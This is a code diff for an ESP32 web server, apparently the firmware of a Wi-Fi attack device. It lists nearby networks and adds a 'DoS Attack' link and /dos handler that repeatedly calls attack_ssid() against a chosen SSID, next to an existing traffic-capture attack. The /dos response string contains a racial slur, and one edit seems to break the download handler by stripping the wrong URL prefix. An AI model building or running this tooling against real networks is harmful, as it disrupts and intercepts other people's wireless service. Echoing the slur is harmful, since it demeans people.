@@ -32,6 +32,17 @@ static const char *TAG = "webserver";
 char* dynamic_content = NULL;
 
 
+char *strremove(char *str, const char *sub) {
+    size_t len = strlen(sub);
+    if (len > 0) {
+        char *p = str;
+        while ((p = strstr(p, sub)) != NULL) {
+            memmove(p, p + len, strlen(p + len) + 1);
+        }
+    }
+    return str;
+}
+
 char* get_auth_mode(int authmode)
 {
     switch (authmode) {
@@ -114,7 +125,7 @@ void generate_dynamic_html(char* dynamic_content) {
         ESP_LOGI(TAG, "waiting for aprecords");
     }
     snprintf(dynamic_content, 2048,
-              "<html> <head> <style> table, th, td { width: 100%%; border: 1px solid black; } table { min-height:70vh ; font-size: 2em; } </style> </head> <body> <h1>ESP32 WEBSERVER</h1> <table> <tr><th><a href=\"captureall.pcap\">Download All</a></th> </tr> <br> <tr> <th>SSID</th> <th>AuthMode</th> <th>Coordinate</th> <th>Attack</th> </tr>");
+              "<html> <head> <style> table, th, td { width: 100%%; border: 1px solid black; } table { min-height:70vh ; font-size: 2em; } </style> </head> <body> <h1>ESP32 WEBSERVER</h1> <h2>Press attack to attack the network, during the attack ESP32 AP will be down make sure to reconnect and press download</h2><table> <tr><th><a href=\"capture.pcap\">Download All</a></th> </tr> <br> <tr> <th>SSID</th> <th>AuthMode</th> <th>Coordinate</th> <th>Attack</th> <th>DoS Attack</th> </tr>");
     
     ESP_LOGI(TAG, "Num_ssid %d",num_ssid);
     for (int i=0; i<num_ssid;i++){
@@ -129,26 +140,45 @@ void generate_dynamic_html(char* dynamic_content) {
             <td><a href=\"download.pcap?");
         strcat(dynamic_content, (char*)apRecords[i].ssid);
         strcat(dynamic_content,"\">Attack</a></td>\
+        ");
+        strcat(dynamic_content, "<td><a href=\"dos?");
+        strcat(dynamic_content, (char*)apRecords[i].ssid);
+        strcat(dynamic_content,"\">DoS Attack</a></td>\
         </tr>");
     }
-    strcat(dynamic_content, "<button onclick=\"location.href=\'new-scan\'\" type=\"button\">\
-         Scan now</button>");
 }
 
-static esp_err_t uri_new_scan_handler(httpd_req_t *req){
-    ESP_LOGD(TAG, "setting scan");
-    ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
-    set_scan();
-    const char *response = (const char *) req->user_ctx;
-    return httpd_resp_send(req,response, strlen(response));
+static esp_err_t uri_dos_handler(httpd_req_t *req){
+
+    ESP_LOGI(TAG, "req->uri PRESO DA Attack DoS: %s", (char*)req->uri);
+
+    
+    char* encodedUrl;
+    //strcpy(ssid,(char*)req->uri);
+    encodedUrl = strremove(req->uri,"/dos?");
+    char* ssid = decodeUrl(encodedUrl);
+    ESP_LOGI(TAG, "SSID->%s", ssid);
+    for(uint8_t i = 0; i < 5; i++){
+        attack_ssid(ssid);
+    }
+    free(ssid);
+	esp_err_t error;
+	const char *response = (const char *) req->user_ctx;
+	error = httpd_resp_send(req, response, strlen(response));
+	if (error != ESP_OK)
+	{
+		ESP_LOGI(TAG, "Error %d while sending Response", error);
+	}
+	else ESP_LOGI(TAG, "Response sent Successfully");
+	return error;
     
 }
 
-static httpd_uri_t uri_new_scan_get = {
-    .uri = "/scan",
+static httpd_uri_t uri_dos = {
+    .uri = "/dos",
     .method = HTTP_GET,
-    .handler = uri_new_scan_handler,
-    .user_ctx = NULL
+    .handler = uri_dos_handler,
+    .user_ctx = "<h1>GET dossed nigger</h2>"
     
 };
 
@@ -166,23 +196,13 @@ static httpd_uri_t uri_capture_pcap_get = {
     .user_ctx = NULL
 };
 
-char *strremove(char *str, const char *sub) {
-    size_t len = strlen(sub);
-    if (len > 0) {
-        char *p = str;
-        while ((p = strstr(p, sub)) != NULL) {
-            memmove(p, p + len, strlen(p + len) + 1);
-        }
-    }
-    return str;
-}
+
 
 
 static esp_err_t download_page_handler(httpd_req_t *req)
 {
 
     ESP_LOGI(TAG, "req->uri PRESO DA DOWNLOAD.PCAP: %s", (char*)req->uri);
-    set_scan();
     uint8_t len_uri = strlen((char*)req->uri) + 1;
     ESP_LOGI(TAG,"%d",len_uri );
     //uint8_t len_uri_tagliare = strlen("/download.pcap?");
@@ -190,7 +210,7 @@ static esp_err_t download_page_handler(httpd_req_t *req)
     if(len_uri>15){
         char* encodedUrl;
         //strcpy(ssid,(char*)req->uri);
-        encodedUrl = strremove(req->uri,"/download.pcap?");
+        encodedUrl = strremove(req->uri,"/dos?");
         char* ssid = decodeUrl(encodedUrl);
         ESP_LOGI(TAG, "SSID->%s", ssid);
         attack_ssid(ssid);
@@ -284,7 +304,7 @@ static httpd_handle_t start_webserver(void)
         httpd_register_uri_handler(server, &root);
         httpd_register_uri_handler(server, &download);
         httpd_register_uri_handler(server, &uri_capture_pcap_get);
-        httpd_register_uri_handler(server, &uri_new_scan_get);
+        httpd_register_uri_handler(server, &uri_dos);
         return server;
     }
 
